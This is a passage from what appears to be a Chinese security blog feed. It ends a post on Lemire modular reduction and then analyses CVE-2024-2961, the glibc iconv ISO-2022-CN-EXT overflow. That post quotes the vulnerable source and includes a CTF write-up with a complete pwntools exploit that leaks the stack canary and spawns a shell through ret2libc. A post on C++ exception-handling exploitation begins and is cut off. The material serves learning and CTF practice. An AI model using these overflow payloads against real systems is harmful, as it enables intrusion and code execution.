92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,289) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g><rect width="846.7" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(3978.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span>。由于误差小于1，结果将会是精确的。</p>
<p>以下是实现 Lemire 约简的代码：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">uint32_t</span> y;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> m = <span class="built_in">uint64_t</span>(<span class="number">-1</span>) / y + <span class="number">1</span>; <span class="comment">// ceil(2^64 / y)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">mod</span><span class="params">(<span class="type">uint32_t</span> x)</span> </span>{</span><br><span class="line">    <span class="type">uint64_t</span> lowbits = m * x;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="type">__uint128_t</span>) lowbits * y) &gt;&gt; <span class="number">64</span>; </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">div</span><span class="params">(<span class="type">uint32_t</span> x)</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> ((<span class="type">__uint128_t</span>) m * x) &gt;&gt; <span class="number">64</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p><strong>除法可除性检查</strong></p>
<p>我们还可以通过乘法来检查 <code>x</code> 是否能被 <code>y</code>
整除。具体地，<code>x</code> 能被 <code>y</code>
整除当且仅当：如果乘法后的小数部分（即 <code>m * x</code> 的低 64
位）没有超过 <code>m</code>，则 <code>x</code> 可被 <code>y</code>
整除。如果超过了，乘法的结果在再次与 <code>y</code> 相乘并右移 64
位时会得到一个非零数值。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">is_divisible</span><span class="params">(<span class="type">uint32_t</span> x)</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> m * x &lt; m;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p><strong>缺点</strong></p>
<p>Lemire 约简的唯一缺点是，它需要使用原始整数类型的 4
倍大小来进行乘法操作，而其他约简方法（如 Barrett
约简）只需要双精度浮点数就可以工作。因此，这种方法在内存上可能会有一定的开销。</p>
]]></content>
      <categories>
        <category>HPC</category>
      </categories>
      <tags>
        <tag>HPC</tag>
        <tag>optimization</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2024-2961</title>
    <url>/blog/2024/09/21/CVE-2024-2961/</url>
    <content><![CDATA[<h4 id="一利用目的">一、利用目的</h4>
<p>在二进制程序调用iconv这个glibc函数时，或是在PHP从一个字符集转换到另一个字符集调用iconv这个API时，其中当编码转换为ISO-2022-CN-EXT时，iconv有可能会产生缓冲区溢出</p>
<h4 id="二利用方式">二、利用方式</h4>
<p>以从UTF-8转义到ISO-2022-CN-EXT为例。要触发此漏洞，我们需要迫使iconv()在输出缓冲区结束前发出一个转义序列。为此，我们可以使用诸如“劄”、“䂚”、“峛“等特殊字符。这将导致1到3字节的溢出，其溢出内容如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">字符 |		溢出内容		|		原UTF-8表示</span><br><span class="line">劄  		$*H [24 2A 48]      	  \xe5\x8a\x84</span><br><span class="line">䂚  		$+J [24 2B 4A]			  \xe4\x82\x9a</span><br><span class="line">峛  		$*H [24 2A 48]			  \xe5\xb3\x9b</span><br></pre></td></tr></table></figure></div>
<h4 id="三漏洞原理">三、漏洞原理</h4>
<p>先贴一张2.27libc中的漏洞点关键代码，具体可在pathToYourLibc/iconvdata/iso-2022-cn-ext.c中查看</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ESC	0x1b</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span>&#123;</span></span><br><span class="line">    ASCII_set = <span class="number">0</span>,</span><br><span class="line">  	GB2312_set,		<span class="comment">//1</span></span><br><span class="line">  	GB12345_set,	<span class="comment">//2</span></span><br><span class="line">  	CNS11643_1_set,	<span class="comment">//3</span></span><br><span class="line">  	ISO_IR_165_set,	<span class="comment">//4</span></span><br><span class="line">  	SO_mask = <span class="number">7</span>,</span><br><span class="line"></span><br><span class="line">  	GB7589_set = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	GB13131_set = <span class="number">2</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	CNS11643_2_set = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	SS2_mask = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line"></span><br><span class="line">  	GB7590_set = <span class="number">1</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	GB13132_set = <span class="number">2</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_3_set = <span class="number">3</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_4_set = <span class="number">4</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_5_set = <span class="number">5</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_6_set = <span class="number">6</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_7_set = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	SS3_mask = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">&#125;</span><br><span class="line">...........................................................</span><br><span class="line"><span class="comment">/* See whether we have to emit an escape sequence.  */</span>		      </span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">set</span> != used)						      </span><br><span class="line">	  &#123;								      </span><br><span class="line">	    <span class="comment">/* First see whether we announced that we use this		      </span></span><br><span class="line"><span class="comment">	       character set.  */</span>					      </span><br><span class="line">	    <span class="keyword">if</span> ((used &amp; SO_mask) != <span class="number">0</span> &amp;&amp; (ann &amp; SO_ann) != (used &lt;&lt; <span class="number">8</span>))	      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *escseq;					      </span><br><span class="line">									      </span><br><span class="line">		<span class="keyword">if</span> (outptr + <span class="number">4</span> &gt; outend)				      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">		    <span class="keyword">break</span>;						      </span><br><span class="line">		  &#125;							      </span><br><span class="line">									      </span><br><span class="line">		assert (used &gt;= <span class="number">1</span> &amp;&amp; used &lt;= <span class="number">4</span>);			      </span><br><span class="line">		escseq = <span class="string">&quot;)A\0\0)G)E&quot;</span> + (used - <span class="number">1</span>) * <span class="number">2</span>;			      </span><br><span class="line">		*outptr++ = ESC;					      </span><br><span class="line">		*outptr++ = <span class="string">&#x27;$&#x27;</span>;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">									      </span><br><span class="line">		ann = (ann &amp; ~SO_ann) | (used &lt;&lt; <span class="number">8</span>);			      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span> ((used &amp; SS2_mask) != <span class="number">0</span> &amp;&amp; (ann &amp; SS2_ann) != (used &lt;&lt; <span class="number">8</span>))</span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *escseq;					      </span><br><span class="line">									      </span><br><span class="line">		assert (used == CNS11643_2_set); <span class="comment">/* XXX */</span>		      </span><br><span class="line">		escseq = <span class="string">&quot;*H&quot;</span>;						      </span><br><span class="line">		*outptr++ = ESC;					      </span><br><span class="line">		*outptr++ = <span class="string">&#x27;$&#x27;</span>;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">									      </span><br><span class="line">		ann = (ann &amp; ~SS2_ann) | (used &lt;&lt; <span class="number">8</span>);			      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span> ((used &amp; SS3_mask) != <span class="number">0</span> &amp;&amp; (ann &amp; SS3_ann) != (used &lt;&lt; <span class="number">8</span>))</span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *escseq;					      </span><br><span class="line">									      </span><br><span class="line">		assert ((used &gt;&gt; <span class="number">5</span>) &gt;= <span class="number">3</span> &amp;&amp; (used &gt;&gt; <span class="number">5</span>) &lt;= <span class="number">7</span>);		      </span><br><span class="line">		escseq = <span class="string">&quot;+I+J+K+L+M&quot;</span> + ((used &gt;&gt; <span class="number">5</span>) - <span class="number">3</span>) * <span class="number">2</span>;		      </span><br><span class="line">		*outptr++ = ESC;					      </span><br><span class="line">		*outptr++ = <span class="string">&#x27;$&#x27;</span>;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">		*outptr++ = *escseq++;					      </span><br><span class="line">									      </span><br><span class="line">		ann = (ann &amp; ~SS3_ann) | (used &lt;&lt; <span class="number">8</span>);			      </span><br><span class="line">	      &#125;								      </span><br><span class="line">									      </span><br><span class="line">	    <span class="keyword">if</span> (used == CNS11643_2_set)					      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)				      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">		    <span class="keyword">break</span>;						      </span><br><span class="line">		  &#125;							      </span><br><span class="line">		*outptr++ = SS2_0;					      </span><br><span class="line">		*outptr++ = SS2_1;					      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span> (used &gt;= CNS11643_3_set &amp;&amp; used &lt;= CNS11643_7_set)	      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)				      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">		    <span class="keyword">break</span>;						      </span><br><span class="line">		  &#125;							      </span><br><span class="line">		*outptr++ = SS3_0;					      </span><br><span class="line">		*outptr++ = SS3_1;					      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	    <span class="keyword">else</span>							      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		<span class="comment">/* We only have to emit something if currently ASCII is	      </span></span><br><span class="line"><span class="comment">		   selected.  Otherwise we are switching within the	      </span></span><br><span class="line"><span class="comment">		   SO charset.  */</span>					      </span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">set</span> == ASCII_set)					      </span><br><span class="line">		  &#123;							      </span><br><span class="line">		    <span class="keyword">if</span> (outptr + <span class="number">1</span> &gt; outend)				      </span><br><span class="line">		      &#123;							      </span><br><span class="line">			result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">			<span class="keyword">break</span>;						      </span><br><span class="line">		      &#125;							      </span><br><span class="line">		    *outptr++ = SO;					      </span><br><span class="line">		  &#125;							      </span><br><span class="line">	      &#125;								      </span><br><span class="line">									      </span><br><span class="line">	    <span class="comment">/* Always test the length here since we have used up all the      </span></span><br><span class="line"><span class="comment">	       guaranteed output buffer slots.  */</span>			      </span><br><span class="line">	    <span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)					      </span><br><span class="line">	      &#123;								      </span><br><span class="line">		result = __GCONV_FULL_OUTPUT;				      </span><br><span class="line">		<span class="keyword">break</span>;							      </span><br><span class="line">	      &#125;								      </span><br><span class="line">	  &#125;								      </span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (outptr + <span class="number">2</span> &gt; outend)					      </span><br><span class="line">	  &#123;								      </span><br><span class="line">	    result = __GCONV_FULL_OUTPUT;				      </span><br><span class="line">	    <span class="keyword">break</span>;							      </span><br><span class="line">	  &#125;								      </span><br><span class="line">									      </span><br><span class="line">	*outptr++ = buf[<span class="number">0</span>];						      </span><br><span class="line">	*outptr++ = buf[<span class="number">1</span>];						      </span><br><span class="line">	<span class="built_in">set</span> = used;							      </span><br><span class="line">      &#125;									      </span><br><span class="line">									      </span><br><span class="line">    <span class="comment">/* Now that we wrote the output increment the input pointer.  */</span>	      </span><br><span class="line">    inptr += <span class="number">4</span>;								      </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
<p>其中比较重要的是知道各种mask是掩码，与目标进行按位与操作时可以提取出掩码对应位的值，也就是提取出特征信息</p>
<p><strong>used</strong>是当前正在处理的字符所属字符集的标识</p>
<p><strong>set</strong>是当前的字符集标识</p>
<p><strong>ann</strong>(annouce)是一个变量，用于记录已声明的字符集。</p>
<p><strong>outptr</strong> 是指向当前输出缓冲区位置的指针。</p>
<p><strong>outend</strong>
是指向输出缓冲区末尾（或可用空间的结束）的指针。</p>
<p><strong>inptr</strong> 是指向当前输入缓冲区位置的指针</p>
<h5 id="三种不同的字符集">三种不同的字符集</h5>
<p>在字符编码转换中，SO（Shift Out）、SS2（Single Shift 2）和SS3（Single
Shift
3）是用于指示不同字符集的特殊控制字符或转义序列。它们在处理多字节字符集（如ISO-2022）时尤其重要。以下是它们的区别和作用：</p>
<h6 id="so-shift-out">SO (Shift Out)</h6>
<ul>
<li><strong>用途</strong>: SO（Shift
Out）是一个控制字符，用于从单字节字符集切换到多字节字符集。</li>
<li><strong>控制字符</strong>: 通常表示为0x0E。</li>
<li><strong>作用</strong>:
在ISO-2022编码中，SO字符表示后续的字节将使用特定的多字节字符集，直到遇到SI（Shift
In）字符为止。SO和SI字符用于在ASCII和其他字符集之间切换。</li>
</ul>
<h6 id="ss2-single-shift-2">SS2 (Single Shift 2)</h6>
<ul>
<li><strong>用途</strong>: SS2（Single Shift
2）是一个转义序列，用于临时从主字符集切换到第二辅助字符集，仅影响紧随其后的一个字符。</li>
<li><strong>控制字符</strong>: 通常表示为0x8E。</li>
<li><strong>作用</strong>:
在处理多字节字符时，SS2指示紧随其后的一个字节应被解释为第二辅助字符集中的字符。使用SS2字符可以在不改变当前字符集的情况下使用不同的字符集中的字符。</li>
</ul>
<h6 id="ss3-single-shift-3">SS3 (Single Shift 3)</h6>
<ul>
<li><strong>用途</strong>: SS3（Single Shift
3）是一个转义序列，用于临时从主字符集切换到第三辅助字符集，仅影响紧随其后的一个字符。</li>
<li><strong>控制字符</strong>: 通常表示为0x8F。</li>
<li><strong>作用</strong>:
类似于SS2，SS3指示紧随其后的一个字节应被解释为第三辅助字符集中的字符。它允许在不改变当前字符集的情况下使用第三辅助字符集中的字符。</li>
</ul>
<p>具体不同字符集所属的类别可见源码中的枚举，mask掩码上方的字符集都是该类型的字符集</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span>&#123;</span></span><br><span class="line">    	ASCII_set = <span class="number">0</span>,</span><br><span class="line">  	GB2312_set,		<span class="comment">//1</span></span><br><span class="line">  	GB12345_set,	<span class="comment">//2</span></span><br><span class="line">  	CNS11643_1_set,	<span class="comment">//3</span></span><br><span class="line">  	ISO_IR_165_set,	<span class="comment">//4</span></span><br><span class="line">  	SO_mask = <span class="number">7</span>,</span><br><span class="line"></span><br><span class="line">  	GB7589_set = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	GB13131_set = <span class="number">2</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	CNS11643_2_set = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line">  	SS2_mask = <span class="number">3</span> &lt;&lt; <span class="number">3</span>,</span><br><span class="line"></span><br><span class="line">  	GB7590_set = <span class="number">1</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	GB13132_set = <span class="number">2</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_3_set = <span class="number">3</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_4_set = <span class="number">4</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_5_set = <span class="number">5</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_6_set = <span class="number">6</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	CNS11643_7_set = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">  	SS3_mask = <span class="number">7</span> &lt;&lt; <span class="number">5</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h5 id="实际运行中的-used-及其对应分支">实际运行中的 used
及其对应分支</h5>
<p>以UTF-8转义到ISO-2022-CN-EXT为例</p>
<p>具体哪一个 <code>used</code>
的值被设置，取决于UTF-8输入字符在ISO-2022-CN-EXT字符集中的对应字符集。例如：</p>
<ul>
<li>如果输入字符是GB2312字符集中的字符，<code>used</code> 将被设置为
<code>GB2312_set</code>（值为1）。</li>
<li>如果输入字符是CNS11643-2字符集中的字符，<code>used</code> 将被设置为
<code>CNS11643_2_set</code>（值为24）。</li>
<li>如果输入字符是CNS11643-3字符集中的字符，<code>used</code> 将被设置为
<code>CNS11643_3_set</code>（值为96）。</li>
</ul>
<p>假设当前输入字符在GB2312字符集中，<code>used</code> 将被设置为
<code>GB2312_set</code>（1），并进入第一个 <code>if</code>
分支，发出对应的转义序列。类似地，对于其他字符集，<code>used</code>
将被设置为相应的值，并进入对应的 <code>if</code> 分支。</p>
<h5 id="具体执行过程">具体执行过程</h5>
<p><strong>1.
检查是否需要发出转义序列</strong>：首先检查当前使用的字符集（<code>set</code>）是否与目标字符集（<code>used</code>）不同。如果不同，则需要发出转义序列。</p>
<p><strong>2. 判断是否已经声明使用该字符集</strong>：</p>
<p>我们现在详细分析下3个if分支的条件</p>
<p><code>if ((used &amp; SO_mask) != 0 &amp;&amp; (ann &amp; SO_ann) != (used &lt;&lt; 8))</code></p>
<ul>
<li><p>used &amp; SO_mask 在目标字符集类型为SO时不为0</p></li>
<li><p>(ann &amp; SO_ann) != (used &lt;&lt;
8)用于检测是否声明过该字符集</p></li>
<li><p>如果目标字符集是<code>SO</code>类型且未声明，则生成相应的转义序列。</p></li>
</ul>
<p><code>else if ((used &amp; SS2_mask) != 0 &amp;&amp; (ann &amp; SS2_ann) != (used &lt;&lt; 8))</code></p>
<ul>
<li>如果目标字符集是<code>SS2</code>类型且未声明，则生成相应的转义序列。</li>
</ul>
<p><code>else if ((used &amp; SS3_mask) != 0 &amp;&amp; (ann &amp; SS3_ann) != (used &lt;&lt; 8))</code></p>
<ul>
<li>如果目标字符集是<code>SS3</code>类型且未声明，则生成相应的转义序列。</li>
</ul>
<p>实际我们发现只有在SO的分支里有一段边界检测的代码</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (outptr + <span class="number">4</span> &gt; outend)				      </span><br><span class="line">&#123;							      </span><br><span class="line">	result = __GCONV_FULL_OUTPUT;			      </span><br><span class="line">	<span class="keyword">break</span>;						     </span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure></div>
<p>那么我们要利用漏洞，首先就要输入一个SS2字符集或SS3字符集的字符。</p>
<p><strong>3.生成转义序列</strong>：</p>
<ul>
<li>根据<code>used</code>字符集的类型，选择相应的转义序列，并写入输出缓冲区<code>outptr</code>。&lt;—关键漏洞点</li>
<li>更新已声明的字符集<code>ann</code>。</li>
</ul>
<p><code>escseq</code>
是一个指向字符数组的指针，用于存储转义序列（escape
sequence）。这些转义序列用于在输出数据中标识字符集的切换或特定字符的编码方式。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *escseq;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如，用于 SO 的情况</span></span><br><span class="line">escseq = <span class="string">&quot;)A\0\0)G)E&quot;</span> + (used - <span class="number">1</span>) * <span class="number">2</span>;</span><br><span class="line">*outptr++ = ESC;</span><br><span class="line">*outptr++ = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如，用于 SS2 的情况</span></span><br><span class="line">escseq = <span class="string">&quot;*H&quot;</span>;</span><br><span class="line">*outptr++ = ESC;</span><br><span class="line">*outptr++ = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例如，用于 SS3 的情况</span></span><br><span class="line">escseq = <span class="string">&quot;+I+J+K+L+M&quot;</span> + ((used &gt;&gt; <span class="number">5</span>) - <span class="number">3</span>) * <span class="number">2</span>;</span><br><span class="line">*outptr++ = ESC;</span><br><span class="line">*outptr++ = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line">*outptr++ = *escseq++;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p><strong>4.为特定字符集生成额外的字节</strong>：</p>
<ul>
<li>如果<code>used</code>是<code>CNS11643_2_set</code>，且<strong>outptr
+ 2 &lt;= outend</strong>则会加上ESC(即0x1b)与0x4e的后缀。</li>
<li>如果<code>used</code>在<code>CNS11643_3_set</code>到<code>CNS11643_7_set</code>之间，且<strong>outptr
+ 2 &lt;= outend</strong>则会加上ESC与0x4f的后缀。</li>
</ul>
<p><strong>5.切换到ASCII字符集时发出SO字节</strong>：如果当前字符集是ASCII需要切换，且<strong>outptr
+ 1 &lt;= outend</strong>，则加入0x0e后缀。</p>
<p><strong>6.检查输出缓冲区长度</strong>：确保在写入新的字节前输出缓冲区<code>outptr</code>有足够的空间，否则返回<code>__GCONV_FULL_OUTPUT</code>错误。</p>
<p><strong>7.改变当前字符集（若与目标字符集不同）</strong>：<code>set = used;</code></p>
<p><strong>8.自增输入指针</strong>：处理完一个字符后，增加输入指针<code>inptr</code>。</p>
<h4 id="四实例分析">四、实例分析</h4>
<h5 id="xgctf-echo">XGCTF [echo]</h5>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185742098.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185755294.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185806653.png"
                      class=""
                >
<p>64位程序开了canary保护，最后有个明显的往s里读0x60字节的栈溢出，那么我们就要想办法先得到canary的值。我们发现canary实际存在var_8处，而最后iconv函数实际对输入进行换编码后会存0x26字节到s中，s与canary之间只差0x28个字节，那么我们利用iconv的漏洞，先填充0x25个垃圾字符，最后写一个会触发漏洞的字符，就可以溢出3字节刚好把canary低位的00给覆盖了，那么printf("%s",s)就能直接把canary的值打印出来了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/CVE-2024-2961/image-20240921185814773.png"
                      class=""
                >
<p>之后有了canary，又能栈溢出，直接ret2libc即可</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./echo&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28257</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./echo&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x25</span> + <span class="string">&quot;劄&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;\x48&quot;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">pop_rdi_ret = <span class="number">0x401493</span></span><br><span class="line">ret_add = <span class="number">0x40101a</span></span><br><span class="line">main_add = <span class="number">0x401256</span></span><br><span class="line">p.sendline(<span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(elf.got[<span class="string">&quot;puts&quot;</span>]) + p64(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p64(main_add)) </span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_add = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_add = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;collectcrop&quot;</span>)</span><br><span class="line">payload2 = <span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span> + p64(canary) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(bin_sh_add) + p64(ret_add) + p64(system_add)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>Exploits under exception handling</title>
    <url>/blog/2024/09/21/Exploits-under-exception-handling/</url>
    <content><![CDATA[<h4 id="引入">引入</h4>
<p>在栈溢出漏洞中，程序没有控制或错误控制输入的大小导致了该漏洞的产生。那我们很自然会想到能不能用<code>try</code>
<code>throw</code>
<code>catch</code>的异常机制来捕获栈溢出行为，从而能更直观的获取错误信息，也在一定程度上避免了一些奇怪的错误产生。但在c++的异常处理实现中，如果我们放任输入数据超过缓冲区大小，冀以异常机制来捕获栈溢出，结果将不尽如人意，甚至还会导致canary保护机制的绕过。</p>
<h4 id="原理题目分析">原理&amp;题目分析</h4>
<p>这里借助题目对其原理进行理解，其中加入了个人的一些推测和理解，有问题处希望师傅们批评指正。</p>
<h5 id="羊城杯logger">[2024 羊城杯]logger</h5>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170437604.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170505641.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170518829.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170528338.png"
                      class=""
                >
<p>这里我一开始参考
<a class="link"   href="https://www.bilibili.com/video/BV1eE421L7ZE/"  title="" target="">DASCTF X GFCTF 2024四月-pwn-control【异常机制】<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>这个视频，想要覆盖掉rbp打栈迁移，实际从throw触发异常到catch捕获的主逻辑在<code>__cxa_throw</code>的<code>_Unwind_RaiseException</code>函数里，其中
<code>_Unwind_RaiseException</code> 是用于栈展开（stack
unwinding）的关键函数之一，其主要功能如下：</p>
<ul>
<li>这个函数负责执行栈展开，即遍历当前调用栈上的各个栈帧，寻找匹配的
<code>catch</code> 块。</li>
<li>栈展开过程中，函数会逐帧回溯，并在每个栈帧上调用编译器生成的处理函数来检查是否存在与异常类型匹配的
